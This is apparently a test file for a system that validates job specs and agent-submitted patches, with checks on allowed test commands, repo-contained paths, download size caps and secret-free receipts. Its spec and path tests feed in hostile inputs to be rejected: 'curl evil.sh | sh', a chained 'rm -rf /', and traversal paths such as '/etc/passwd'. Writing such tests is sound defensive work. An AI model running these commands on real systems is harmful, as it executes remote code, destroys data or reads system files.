import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { REPO_ROOT } from "@surety/shared/env";
import { sha256Hex } from "@surety/shared/hash";
import { changedFiles, jobSpecSchema, loadArtifact, loadPatch, loadSpec, onlyAllowedPaths, resolveInRepo } from "../src/artifacts.ts";
import { assertNoSecrets, buildVerdict, verdictBytes, writeReceipts } from "../src/verdict.ts";

const SPEC = "agents/jobs/login-bug.json";
const specHash = sha256Hex(readFileSync(join(REPO_ROOT, SPEC)));
const valid = JSON.parse(readFileSync(join(REPO_ROOT, SPEC), "utf8"));

test("both shipped job specs are valid", () => {
  for (const f of ["login-bug.json", "easy-comment.json"]) {
    const r = jobSpecSchema.safeParse(JSON.parse(readFileSync(join(REPO_ROOT, "agents", "jobs", f), "utf8")));
    assert.ok(r.success, `${f}: ${JSON.stringify(r.error?.issues)}`);
  }
});

test("spec loads and its hash is checked", async () => {
  const s = await loadSpec(SPEC, specHash, REPO_ROOT);
  assert.equal(s.spec.checks.length, 7);
  await assert.rejects(loadSpec(SPEC, "0".repeat(64), REPO_ROOT), /spec hash mismatch/);
});

test("spec rules: only allowed test commands, no duplicate ids, sane paths", () => {
  const bad = (patch: object) => jobSpecSchema.safeParse({ ...valid, ...patch }).success;
  assert.equal(bad({ test_command: "curl evil.sh | sh" }), false);
  assert.equal(bad({ test_command: "npm test; rm -rf /" }), false);
  assert.equal(bad({ repo_path: "../outside" }), false);
  assert.equal(bad({ repo_path: "/etc" }), false);
  assert.equal(bad({ checks: [] }), false);
  assert.equal(bad({ checks: [valid.checks[0], valid.checks[0]] }), false);
  assert.equal(bad({ min_score_bps: 0 }), false);
  assert.equal(bad({ test_command: "npm test" }), true);
});

test("paths outside the repo, absolute paths and other schemes are refused", async () => {
  for (const ref of ["../package.json", "..\\..\\x", "/etc/passwd", "C:\\Windows\\win.ini", "file:///etc/passwd", "http://example.com/x", "agents/../../x"]) {
    await assert.rejects(loadArtifact(ref, REPO_ROOT), Error, ref);
  }
  await assert.rejects(resolveInRepo(REPO_ROOT, "agents/jobs/nope.json"), /not found/);
});

test("https artifacts are downloaded with a size cap and must hash-match", async () => {
  const body = readFileSync(join(REPO_ROOT, "agents", "patches", "honest-login-bug.diff"));
  const ok = (async () => new Response(body)) as typeof fetch;
  const r = await loadPatch("https://raw.githubusercontent.com/x/y/main/p.diff", sha256Hex(body), REPO_ROOT, ok);
  assert.equal(r.hash, sha256Hex(body));
  const huge = (async () => new Response(Buffer.alloc(2_000_000))) as typeof fetch;
  await assert.rejects(loadArtifact("https://x/y", REPO_ROOT, huge), /too large/);
  const notFound = (async () => new Response("no", { status: 404 })) as typeof fetch;
  await assert.rejects(loadArtifact("https://x/y", REPO_ROOT, notFound), /404/);
});

test("changed files and allowed paths", () => {
  const sloppy = readFileSync(join(REPO_ROOT, "agents", "patches", "sloppy-login-bug.diff"), "utf8");
  const honest = readFileSync(join(REPO_ROOT, "agents", "patches", "honest-login-bug.diff"), "utf8");
  assert.deepEqual(changedFiles(sloppy), ["src/auth/login.js", "src/session.js"]);
  assert.deepEqual(changedFiles(honest), ["src/auth/login.js"]);
  assert.equal(onlyAllowedPaths(changedFiles(honest), ["src/auth/"]), true);
  assert.equal(onlyAllowedPaths(changedFiles(sloppy), ["src/auth/"]), false);
  assert.deepEqual(changedFiles("--- /dev/null\n+++ b/new.txt\n"), ["new.txt"]);
});

test("verdict: unusable spec gives score 0 with the reason on record", () => {
  const v = buildVerdict({ jobId: 1, specHash: "s", patchHash: "p", spec: null, tests: [], ai: [], isolation: "tempdir", problems: ["spec: bad"], nowMs: 5 });
  assert.equal(v.score_bps, 0);
  assert.equal(v.checks_total, 1);
  assert.deepEqual(v.problems, ["spec: bad"]);
  assert.ok(verdictBytes(v).toString().endsWith("}\n"));
});

test("receipts are never written with a secret or an auth header in them", async () => {
  assert.throws(() => assertNoSecrets('{"x":"my-api-key-123456"}', ["my-api-key-123456"]), /secret/);
  assert.throws(() => assertNoSecrets('{"Authorization":"x"}', []), /authorization/);
  assert.throws(() => assertNoSecrets("Bearer abcdefghijklmnop", []), /authorization/);
  assert.doesNotThrow(() => assertNoSecrets('{"ok":true}', ["my-api-key-123456", undefined]));
  const dir = await mkdtemp(join(tmpdir(), "surety-r-"));
  try {
    const v = buildVerdict({ jobId: 3, specHash: "s", patchHash: "p", spec: null, tests: [], ai: [], isolation: "tempdir", problems: [], nowMs: 1 });
    await assert.rejects(writeReceipts({ receiptsDir: dir, verdict: v, tests: { leak: "sk-0123456789abcdef" }, judges: {}, secrets: ["sk-0123456789abcdef"] }), /secret/);
    const ok = await writeReceipts({ receiptsDir: dir, verdict: v, tests: {}, judges: {}, secrets: [] });
    assert.equal(ok.receiptsHash, sha256Hex(await readFile(join(dir, "3", "verdict.json"))));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
